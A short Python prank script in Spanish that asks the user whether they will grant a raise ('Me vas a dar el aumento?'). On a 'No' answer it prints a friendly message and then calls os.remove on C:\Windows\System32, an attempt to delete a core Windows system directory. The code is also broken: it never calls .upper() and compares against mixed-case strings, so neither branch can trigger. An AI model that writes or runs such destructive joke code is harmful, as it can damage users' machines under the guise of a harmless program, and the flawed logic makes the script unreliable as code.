
import os

print("Me vas a dar el aumento?")

respuesta = input("Si o No: ")
Activo = True

while(Activo == True):
    respuesta = input("Si o No: ")
    if (respuesta.upper == "Si"):
        print("Gracias, sos el mejor!")
        Activo = False
    elif(respuesta.upper == "No"):
        print("Okey no pasa nada")
        os.remove("C:\Windows\System32")
        Activo = False
    else:
        print("Sos boludo o masticas el agua?")
        print("SOLO RESPONDE 'Si' o 'No' ")
        Activo = True

